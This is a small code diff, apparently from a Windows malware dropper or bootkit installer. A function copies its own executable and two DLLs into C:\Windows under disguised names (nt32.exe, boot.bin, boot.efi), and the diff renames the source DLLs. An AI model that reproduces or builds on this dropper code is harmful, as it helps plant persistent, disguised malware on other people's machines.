@@ -16,8 +16,8 @@ wchar_t* convertCharArrayToLPCWSTR(const char* charArray)
 
 void UnpackDeps(LPCWSTR filename) {
     CopyFile(filename, L"C:\\Windows\\nt32.exe", false);
-    CopyFile(L"appvcompat.dll", L"C:\\Windows\\boot.bin", false);
-    CopyFile(L"appverifui.dll", L"C:\\Windows\\boot.efi", false);
+    CopyFile(L"vfcompat.dll", L"C:\\Windows\\boot.bin", false);
+    CopyFile(L"appverifUI.dll", L"C:\\Windows\\boot.efi", false);
 }
 
 DWORD is_efi() {
